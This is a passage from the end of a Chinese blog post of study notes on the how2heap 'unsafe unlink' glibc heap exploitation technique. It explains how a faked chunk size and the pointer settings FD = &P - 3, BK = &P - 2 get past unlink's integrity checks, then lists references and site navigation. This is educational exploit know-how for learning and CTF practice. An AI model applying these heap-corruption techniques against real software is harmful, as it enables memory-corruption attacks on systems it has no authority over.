+根据推导令<code>x = chunk0_ptr[1] &amp; (~ 0x7)</code>，即<code>x</code>为<code>fake chunk</code>的大小，
+得出通过上述判定条件的公式为<code>*(chunk0_ptr+x)=x</code>。而我们的<code>size</code>位于偏移8字节处，所以<code>x=8</code>。这是我个人理解，源代码和参考博客里面的这部分我没有看懂。</p>
+<p>为了通过<code>(P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False</code>判断，（当然<code>P = chunk0_ptr</code>）根据偏移量计算即可轻松满足。
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FD = &amp;P - 3</span><br><span class="line">BK = &amp;P - 2</span><br></pre></td></tr></table></figure></p>
+<p>整个利用过程我觉得下面这张图片足够说明。</p>
+<figure>
+<img src="/img/how2heap-unsafe-unlink/unsafe_unlink.jpg"
+alt="整体结构图" />
+<figcaption aria-hidden="true">整体结构图</figcaption>
+</figure>
+<h1 id="参考">参考</h1>
+<p>[1] <a
+target="_blank" rel="noopener" href="http://vancir.com/posts/how2heap-04-unsafe-unlink">how2heap-04
+unsafe unlink实践笔记</a> [2] <a
+target="_blank" rel="noopener" href="http://blog.csdn.net/qq_29343201/article/details/53558216">linux堆溢出学习之unsafe
+unlink</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/heap/" rel="tag"># heap</a>
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2017/09/01/%E5%A0%86%E6%BA%A2%E5%87%BA%E4%B9%8BWerewolf/" rel="prev" title="堆溢出之Werewolf">
+                  <i class="fa fa-angle-left"></i> 堆溢出之Werewolf
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2017/09/16/hitcon-ctf-2014-stkof-writeup/" rel="next" title="hitcon-ctf-2014/stkof writeup">
+                  hitcon-ctf-2014/stkof writeup <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2023</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Max</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+</body>
+</html>
